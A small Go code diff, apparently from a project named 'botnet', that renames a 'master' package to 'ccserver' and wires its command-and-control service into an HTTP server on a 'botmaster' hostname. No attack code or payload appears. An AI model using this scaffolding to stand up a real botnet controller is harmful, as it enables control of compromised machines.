@@ -3,13 +3,13 @@ package main
 import (
 	"log"
 
-	"github.com/adrianosela/botnet/master"
+	"github.com/adrianosela/botnet/ccserver"
 	"github.com/adrianosela/sslmgr"
 )
 
 func main() {
 	ss, err := sslmgr.NewServer(sslmgr.ServerConfig{
-		Handler:      master.NewMasterService(),
+		Handler:      ccserver.NewCCService(),
 		Hostnames:    []string{"botmaster.adrianosela.com"},
 		ServeSSLFunc: func() bool { return false }, // for now
 	})
